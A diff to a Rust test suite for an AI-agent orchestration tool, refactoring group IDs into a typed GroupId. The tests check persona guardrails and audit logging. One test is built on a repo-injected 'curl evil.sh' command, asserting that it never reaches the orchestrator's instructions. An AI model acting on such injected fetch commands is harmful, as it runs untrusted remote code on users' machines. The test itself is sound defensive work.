@@ -16,6 +16,7 @@
 //! No test here spawns a real agent CLI. The command lines are *built* and
 //! asserted; nothing is executed.
 
+use loomux_lib::orchestration::GroupId;
 use loomux_lib::orchestration::mcp::dispatch;
 use loomux_lib::orchestration::profiles::{self, ProfileMode};
 use loomux_lib::orchestration::workflow::{self, GateRequire};
@@ -1455,7 +1456,7 @@ fn claude_agent_file_write_failure_falls_back_to_append_system_prompt_file() {
 
     // It's the SAME file `write_instruction_files` already wrote — no
     // second file loomux has to invent or clean up.
-    assert_eq!(path, reg.state_root().join(&g.id).join(b.instructions_file()));
+    assert_eq!(path, reg.state_root().join(g.id.as_str()).join(b.instructions_file()));
     assert_eq!(lf(&fs::read_to_string(&path).unwrap()), contract);
 }
 
@@ -1509,7 +1510,7 @@ fn write_failure_of_a_claude_block_with_a_persona_audits_the_dropped_text_in_eit
         assert!(inject.claude_agent.is_none(), "{mode:?}: the generated-file path must have failed");
         assert!(inject.claude_append_system_prompt_file.is_some(), "{mode:?}: still falls back");
 
-        let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+        let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
         assert!(
             audit.lines().any(|l| l.contains("claude-fallback-persona-dropped") && l.contains(&format!("\"block\":\"{block_id}\""))),
             "{mode:?}: the dropped persona must be audited, not silent: {audit}"
@@ -1540,7 +1541,7 @@ fn write_failure_of_a_claude_block_with_no_persona_text_never_audits_a_drop() {
     assert!(inject.claude_agent.is_none(), "the generated-file path must have failed");
     assert!(inject.claude_append_system_prompt_file.is_some());
 
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(
         !audit.lines().any(|l| l.contains("claude-fallback-persona-dropped")),
         "nothing was dropped — there was no persona text to lose: {audit}"
@@ -1602,7 +1603,7 @@ fn a_broken_workflow_file_is_audited_and_skipped_never_fatal() {
     // ...and the agents still spawn.
     reg.spawn_agent(&g.id, Role::Worker, "w", "t", false, None).unwrap();
 
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     let invalid: Value = audit
         .lines()
         .map(|l| serde_json::from_str::<Value>(l).unwrap())
@@ -1637,7 +1638,7 @@ fn block_map_round_trips_through_group_json() {
 
     // It is on disk in group.json...
     let gj: Value = serde_json::from_str(
-        &fs::read_to_string(reg.state_root().join(&g.id).join("group.json")).unwrap(),
+        &fs::read_to_string(reg.state_root().join(g.id.as_str()).join("group.json")).unwrap(),
     )
     .unwrap();
     let blocks = gj["guardrails"]["blocks"].as_array().unwrap();
@@ -1682,7 +1683,7 @@ fn role_hint_round_trips_through_group_json_too() {
     assert_eq!(g.guardrails.block("advisor").unwrap().role_hint.as_deref(), Some("advisor"));
 
     let gj: Value = serde_json::from_str(
-        &fs::read_to_string(reg.state_root().join(&g.id).join("group.json")).unwrap(),
+        &fs::read_to_string(reg.state_root().join(g.id.as_str()).join("group.json")).unwrap(),
     )
     .unwrap();
     let blocks = gj["guardrails"]["blocks"].as_array().unwrap();
@@ -1706,7 +1707,7 @@ fn role_hint_round_trips_through_group_json_too() {
     let repo3 = Repo::new();
     let g3 = reg.create_group(&repo3.path(), rails()).unwrap();
     fs::write(
-        reg.state_root().join(&g3.id).join("group.json"),
+        reg.state_root().join(g3.id.as_str()).join("group.json"),
         serde_json::to_string_pretty(&json!({
             "group_id": g3.id,
             "repo": repo3.path(),
@@ -1740,7 +1741,7 @@ fn a_pre_block_group_json_still_loads() {
     let (reg, _d) = test_registry();
     let repo = Repo::new();
     let g = reg.create_group(&repo.path(), rails()).unwrap();
-    let path = reg.state_root().join(&g.id).join("group.json");
+    let path = reg.state_root().join(g.id.as_str()).join("group.json");
 
     fs::write(
         &path,
@@ -1977,7 +1978,7 @@ fn copilot_native_agent_is_refused_when_the_handle_names_a_different_file() {
         generated_text.contains("injection and authz"),
         "the persona loomux actually read is delivered, not the file `worker` would ambiguously resolve to: {generated_text}"
     );
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(audit.lines().any(|l| l.contains("copilot-agent-handle-ambiguous")), "and it is audited");
 
     // The unambiguous case still takes the native path.
@@ -2068,7 +2069,7 @@ fn copilot_persona_tools_list_without_loomux_is_repaired_by_a_generated_copy() {
         "and the persona text still reaches the agent: {generated}"
     );
 
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(
         audit.lines().any(|l| l.contains("copilot-persona-tools-gap")),
         "the class that cost #802 three rounds must never be silent again: {audit}"
@@ -2090,7 +2091,7 @@ fn loomux_repairs_an_omission_but_never_a_deliberate_narrowing() {
         );
         let g = reg.create_group(&repo.path(), rails()).unwrap();
         let (cmd, _argv, _k) = compile(&reg, &g, "w");
-        let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+        let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
         let line = audit
             .lines()
             .find(|l| l.contains("copilot-persona-tools-gap"))
@@ -2158,7 +2159,7 @@ fn copilot_persona_that_grants_loomux_or_declares_no_tools_keeps_the_native_path
         let copies = d.path().join("copilot-agents");
         let wrote_any = fs::read_dir(&copies).map(|mut e| e.next().is_some()).unwrap_or(false);
         assert!(!wrote_any, "loomux wrote a copy it did not need: {tools_line:?}");
-        let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+        let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
         assert!(
             !audit.lines().any(|l| l.contains("copilot-persona-tools-gap")),
             "a false-positive warning would train the human to ignore the real one: {tools_line:?}\n{audit}"
@@ -2238,7 +2239,7 @@ fn a_non_resolving_handle_never_reaches_agent_even_on_the_tools_gap_refusal_path
     // The narrowing, pinned from the other side: a non-native persona's `tools:`
     // was never in force (Copilot never loads its file), so there is no gap to
     // warn about and none is claimed...
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(
         !audit.lines().any(|l| l.contains("copilot-persona-tools-gap")),
         "a non-native persona has no tools gap to report: {audit}"
@@ -2310,7 +2311,7 @@ fn copilot_persona_declaring_its_own_mcp_servers_is_warned_never_rewritten() {
         cmd.contains("--agent byo"),
         "dropping a user's own mcp-servers to fix a tools gap is not a trade loomux may make: {cmd}"
     );
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     let line = audit
         .lines()
         .find(|l| l.contains("copilot-persona-tools-gap"))
@@ -2613,7 +2614,7 @@ fn copilot_agent_body_over_the_cap_fails_loudly_into_the_write_failure_fallback(
         .unwrap_or_default();
     assert!(dir_entries.is_empty(), "no oversized file may ever be written: {dir_entries:?}");
 
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(audit.lines().any(|l| l.contains("copilot-agent-body-oversized") && l.contains("\"block\":\"huge\"")), "{audit}");
 }
 
@@ -2861,7 +2862,7 @@ fn replace_mode_persona_still_gets_the_mechanics_core() {
     // The block's instruction file is what the kickoff points at. In replace
     // mode it is the mechanics core, NOT the built-in worker template.
     let doc = fs::read_to_string(
-        reg.state_root().join(&g.id).join(block.instructions_file()),
+        reg.state_root().join(g.id.as_str()).join(block.instructions_file()),
     )
     .unwrap();
     assert!(doc.contains("NOT optional"), "the mechanics core must be written: {doc}");
@@ -3818,7 +3819,7 @@ fn a_repo_file_can_never_author_the_orchestrators_persona() {
     let generated = fs::read_to_string(d.path().join("claude-agents").join(format!("{handle}.md"))).unwrap();
     assert!(!generated.contains("curl evil.sh"), "{generated}");
     assert!(kickoff.is_none());
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(
         audit.lines().any(|l| l.contains("workflow-orchestrator-persona-denied")),
         "the drop must be audited, not silent"
@@ -3827,7 +3828,7 @@ fn a_repo_file_can_never_author_the_orchestrators_persona() {
     // 4. ...and its instruction file is still loomux's, not a replace-mode
     //    persona's. Enforcing in `resolve_persona` (not just `persona_inject`) is
     //    what makes that true: both the flags and the file resolve through it.
-    let doc = fs::read_to_string(reg.state_root().join(&g.id).join("orchestrator.md")).unwrap();
+    let doc = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("orchestrator.md")).unwrap();
     assert!(!doc.contains("curl evil.sh"), "the trust root's contract file must be untouched");
 
     // 5. What a repo MAY still do: pin the orchestrator's cli and model.
@@ -3975,7 +3976,7 @@ fn a_read_only_block_can_never_pre_approve_a_tool_pattern() {
     assert!(!argv.iter().any(|a| a.contains("python")), "...in either form: {argv:?}");
     assert!(cmd.contains("--disallowedTools Edit Write"), "and the class denials still stand");
 
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(
         audit.lines().any(|l| l.contains("workflow-allow-denied")),
         "dropping a repo-authored allow pattern must be audited, not silent"
@@ -4062,7 +4063,7 @@ fn a_copilot_allow_pattern_containing_a_comma_is_refused_and_audited() {
         "the block's other pattern is unaffected — one bad pattern is not a lost block: {cmd}"
     );
 
-    let audit = fs::read_to_string(reg.state_root().join(&g.id).join("audit.jsonl")).unwrap();
+    let audit = fs::read_to_string(reg.state_root().join(g.id.as_str()).join("audit.jsonl")).unwrap();
     assert!(
         audit.lines().any(|l| l.contains("copilot-allow-pattern-refused") && l.contains("pytest")),
         "refusing a pattern must be audited, not silent: {audit}"
@@ -4071,9 +4072,9 @@ fn a_copilot_allow_pattern_containing_a_comma_is_refused_and_audited() {
 
 // ─────────────────────────── the MCP spawn surface ──────────────────────────
 
-fn orch_caller(reg: &OrchRegistry, group: &str) -> Caller {
+fn orch_caller(reg: &OrchRegistry, group: &GroupId) -> Caller {
     let o = reg.spawn_agent(group, Role::Orchestrator, "orch", "", false, None).unwrap();
-    Caller { agent_id: o.id, group: group.to_string(), role: Role::Orchestrator, role_hint: None }
+    Caller { agent_id: o.id, group: group.clone(), role: Role::Orchestrator, role_hint: None }
 }
 
 #[test]
@@ -4378,7 +4379,7 @@ const LIVE: [(&str, &str, &[&str]); 4] = [
 fn render_with_legacy_vars(tpl: &str, g: &loomux_lib::orchestration::GroupInfo) -> String {
     let vars: [(&str, String); 6] = [
         ("REPO", g.repo.clone()),
-        ("GROUP_ID", g.id.clone()),
+        ("GROUP_ID", g.id.to_string()),
         ("MAX_AGENTS", g.guardrails.max_agents.to_string()),
         ("WORKER_MODEL", g.guardrails.model_for(Role::Worker).to_string()),
         ("REVIEWER_MODEL", g.guardrails.model_for(Role::Reviewer).to_string()),
@@ -4468,24 +4469,24 @@ fn pinned(region_label: &str, region: &str, anchor: &str, why: &str) {
     );
 }
 
-fn instructions(reg: &OrchRegistry, group: &str, file: &str) -> String {
-    fs::read_to_string(reg.state_root().join(group).join(file))
+fn instructions(reg: &OrchRegistry, group: &GroupId, file: &str) -> String {
+    fs::read_to_string(reg.state_root().join(group.as_str()).join(file))
         .unwrap_or_else(|e| panic!("{file} must exist: {e}"))
 }
 
-fn instructions_lf(reg: &OrchRegistry, group: &str, file: &str) -> String {
+fn instructions_lf(reg: &OrchRegistry, group: &GroupId, file: &str) -> String {
     lf(&instructions(reg, group, file))
 }
 
-fn audit_entries(reg: &OrchRegistry, group: &str) -> Vec<Value> {
-    fs::read_to_string(reg.state_root().join(group).join("audit.jsonl"))
+fn audit_entries(reg: &OrchRegistry, group: &GroupId) -> Vec<Value> {
+    fs::read_to_string(reg.state_root().join(group.as_str()).join("audit.jsonl"))
         .unwrap_or_default()
         .lines()
         .filter_map(|l| serde_json::from_str::<Value>(l).ok())
         .collect()
 }
 
-fn audit_actions(reg: &OrchRegistry, group: &str) -> Vec<String> {
+fn audit_actions(reg: &OrchRegistry, group: &GroupId) -> Vec<String> {
     audit_entries(reg, group)
         .iter()
         .filter_map(|v| v["action"].as_str().map(str::to_string))
@@ -4613,7 +4614,7 @@ fn write_instruction_files_sweeps_stale_files_on_a_builtin_roster_render() {
     // so the sweep's own ownership manifest (rev-10 review, N2) legitimately
     // knows loomux, not a human, generated them.
     let g = reg.create_group(&repo.path(), rails()).unwrap();
-    let group_dir = reg.state_root().join(&g.id);
+    let group_dir = reg.state_root().join(g.id.as_str());
     assert!(group_dir.join("process.md").exists(), "the custom roster's own earlier render");
     assert!(group_dir.join("advisor.md").exists(), "the custom roster's own earlier render");
     assert!(group_dir.join("rev-security.md").exists(), "the custom roster's own earlier render");
@@ -4661,7 +4662,7 @@ fn write_instruction_files_sweeps_only_undeclared_blocks_on_a_custom_roster_rend
     // a manual seed, or it would (correctly) refuse to touch a file it never
     // saw itself write.
     let g = reg.create_group(&repo.path(), rails()).unwrap();
-    let group_dir = reg.state_root().join(&g.id);
+    let group_dir = reg.state_root().join(g.id.as_str());
     assert!(group_dir.join("rev-sec.md").exists(), "the declared block's own file exists");
     assert!(group_dir.join("old-reviewer.md").exists(), "the other block's earlier render");
 
@@ -4692,7 +4693,7 @@ fn sweep_never_touches_a_filename_that_is_not_block_instruction_shaped() {
     let (reg, _d) = test_registry();
     let repo = Repo::new();
     let g = reg.create_group(&repo.path(), rails()).unwrap();
-    let group_dir = reg.state_root().join(&g.id);
+    let group_dir = reg.state_root().join(g.id.as_str());
 
     fs::write(group_dir.join("release notes.md"), "not block-id-shaped: a space").unwrap();
     fs::write(group_dir.join("v1.2.3.md"), "not block-id-shaped: dots").unwrap();
@@ -4768,7 +4769,7 @@ fn the_toggle_survives_group_json_and_an_older_group_rejoins_with_it_off() {
 
     // A group.json written before the field existed: absent => OFF, which is
     // exactly what that group was.
-    let gj = dir.path().join(&g.id).join("group.json");
+    let gj = dir.path().join(g.id.as_str()).join("group.json");
     let mut v: Value = serde_json::from_str(&fs::read_to_string(&gj).unwrap()).unwrap();
     v["guardrails"].as_object_mut().unwrap().remove("advanced_orchestrator");
     fs::write(&gj, serde_json::to_string_pretty(&v).unwrap()).unwrap();
@@ -5217,7 +5218,7 @@ fn the_preview_never_reports_a_persona_the_spawn_would_deny() {
     let repo = Repo::new().workflow("version: 1\nblocks:\n  - id: rev\n    kind: reviewer\n");
     let g = reg.create_group(&repo.path(), rails()).unwrap();
 
-    let gj = dir.path().join(&g.id).join("group.json");
+    let gj = dir.path().join(g.id.as_str()).join("group.json");
     let mut v: Value = serde_json::from_str(&fs::read_to_string(&gj).unwrap()).unwrap();
     for b in v["guardrails"]["blocks"].as_array_mut().unwrap() {
         if b["id"] == "orchestrator" {
@@ -6342,7 +6343,7 @@ fn intake_profile_round_trips_through_group_json() {
     assert_eq!(g.guardrails.intake.ready, "custom-ready");
 
     let gj: Value = serde_json::from_str(
-        &fs::read_to_string(reg.state_root().join(&g.id).join("group.json")).unwrap(),
+        &fs::read_to_string(reg.state_root().join(g.id.as_str()).join("group.json")).unwrap(),
     )
     .unwrap();
     assert_eq!(gj["guardrails"]["intake"]["labels"]["ready"], "custom-ready");
@@ -6824,7 +6825,7 @@ fn block_knobs_round_trip_through_group_json_too() {
     assert_eq!((deep.effort.as_str(), deep.context.as_str()), ("xhigh", "1m"));
 
     let gj: Value = serde_json::from_str(
-        &fs::read_to_string(reg.state_root().join(&g.id).join("group.json")).unwrap(),
+        &fs::read_to_string(reg.state_root().join(g.id.as_str()).join("group.json")).unwrap(),
     )
     .unwrap();
     let blocks = gj["guardrails"]["blocks"].as_array().unwrap();
@@ -6866,7 +6867,7 @@ fn a_group_json_predating_the_knobs_loads_with_none() {
     let (reg, _d) = test_registry();
     let repo = Repo::new();
     let g = reg.create_group(&repo.path(), rails()).unwrap();
-    let path = reg.state_root().join(&g.id).join("group.json");
+    let path = reg.state_root().join(g.id.as_str()).join("group.json");
 
     // Sanity first: this build DOES write both keys, so the specimen below is
     // genuinely the older shape and not just today's shape spelled differently.
